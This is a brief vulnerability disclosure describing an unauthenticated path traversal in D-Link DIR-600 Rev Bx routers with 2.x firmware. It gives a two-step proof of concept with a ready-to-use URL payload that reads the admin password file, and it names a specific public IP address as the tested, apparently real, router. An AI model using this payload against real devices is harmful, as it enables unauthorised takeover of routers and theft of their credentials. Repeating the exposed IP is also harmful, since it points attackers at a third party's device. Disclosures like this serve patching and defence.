1) Description

After Successfully Connected to D-Link DIR-600
Router(FirmWare Version : 2.01), Any User Can Easily Bypass The Router's
Admin Panel Just by adding a simple payload into URL.

D-Link DIR-600 Rev Bx devices with v2.x firmware allow remote attackers to
read passwords via a model/__show_info.php?REQUIRE_FILE= absolute path traversal attack,
as demonstrated by discovering the admin password.

Its More Dangerous when your Router has a public IP with remote login
enabled.


IN MY CASE,
Tested Router IP : http://190.164.170.249



Video POC : https://www.youtube.com/watch?v=PeNOJORAQsQ

2) Proof of Concept

Step 1: Go to
Router Login Page : http://190.164.170.249:8080

Step 2:
Add the payload to URL.

Payload: model/__show_info.php?REQUIRE_FILE=%2Fvar%2Fetc%2Fhttpasswd
